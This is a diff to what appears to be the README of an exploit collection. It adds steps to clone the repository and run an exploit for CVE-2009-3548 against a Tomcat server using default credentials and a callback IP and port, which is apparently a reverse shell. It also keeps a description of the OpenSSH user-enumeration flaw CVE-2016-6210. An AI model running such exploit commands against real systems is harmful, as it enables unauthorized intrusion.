@@ -4,6 +4,22 @@
 
 ## Examples
 
+1. clone the repository
+
+```bash
+git clone https://github.com/cocomelonc/vulnexipy
+```
+
+2. go to the dir:
+```bash
+cd vulnexipy
+```
+
+3. run python exploit, for example:
+```bash
+python3 cve_2009_3548.py -u http://172.16.64.101:8080/ -U tomcat -P s3cret -i 172.16.64.10 -p 4444
+```
+
 CVE-2016-6210 - sshd in OpenSSH before 7.3, when SHA256 or SHA512 are used for user password hashing, uses BLOWFISH hashing on a static password when the username does not exist, which allows remote attackers to enumerate users by leveraging the timing difference between responses when a large password is provided.
 
 ```bash
